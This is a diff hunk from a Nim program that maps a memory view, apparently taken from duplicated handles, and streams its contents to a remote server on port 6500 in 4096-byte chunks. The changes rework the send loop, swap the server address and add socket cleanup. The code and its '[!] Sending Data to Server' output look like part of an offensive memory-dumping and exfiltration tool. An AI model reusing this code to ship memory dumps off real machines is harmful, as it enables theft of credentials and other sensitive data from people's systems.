@@ -284,16 +284,29 @@ when isMainModule:
     var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
     echo "\n[!] Mapped Data at: 0x", repr mappedData, " - Size: ", size
     
-    #var dataPointer = mappedData
+    var dataPointer = mappedData
     #var dumpSeq: seq[byte] = @[]
     #var countDP: int = 1
     let socket = newSocket()
-    socket.connect("1.1.1.1", Port(6500))
+    socket.connect("0.0.0.0", Port(6500))
 
-    echo "[!] Sending Data to Server..."
-    discard socket.send(mappedData, size)
+    echo "\n[!] Sending Data to Server..."
+    var bytesSent: int = 0
+    while dataPointer <= (mappedData + size):
+        if (size.int - bytesSent) < 4096:
+            bytesSent += socket.send(dataPointer, (size.int - bytesSent))
+            break
+        else: 
+            bytesSent += socket.send(dataPointer, 4096)
+            dataPointer += 4096
+
+    echo "\n[!] Sent ", bytesSent, " Bytes"
+    if bytesSent < size.int:
+        echo "[!] Bytes Sent (", bytesSent, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"
 
     echo "\n[!] Cleaning Up..."
+    
+    socket.close()
     UnmapViewOfFile(mappedData)
     #discard readLine(stdin)
     for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
